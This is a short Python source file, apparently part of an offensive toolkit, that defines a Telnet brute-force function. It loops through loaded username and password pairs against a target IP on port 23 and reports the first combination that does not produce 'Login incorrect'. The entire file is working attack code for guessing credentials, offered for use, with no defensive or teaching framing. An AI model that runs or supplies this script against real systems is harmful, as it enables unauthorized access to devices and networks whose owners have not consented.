import telnetlib
from bruteforce.credentials_loader import load_credentials

def telnet_bruteforce(ip, port=23):
    creds = load_credentials()

    GREEN = "\033[92m"
    RED = "\033[91m"
    YELLOW = "\033[93m"
    RESET = "\033[0m"

    print(f"{YELLOW}[*] Trying Telnet brute-force on {ip}:{port}{RESET}")

    for username, password in creds:
        try:
            tn = telnetlib.Telnet(ip, port, timeout=3)
            tn.read_until(b"login:")
            tn.write(username.encode('ascii') + b"\n")
            tn.read_until(b"Password:")
            tn.write(password.encode('ascii') + b"\n")
            response = tn.read_some()

            if b"Login incorrect" not in response:
                print(f"{GREEN}[+] Telnet login success: {username}:{password}{RESET}")
                tn.close()
                return (username, password)

            tn.close()

        except Exception:
            continue

    print(f"{RED}[-] No valid Telnet credentials found.{RESET}")
    return None
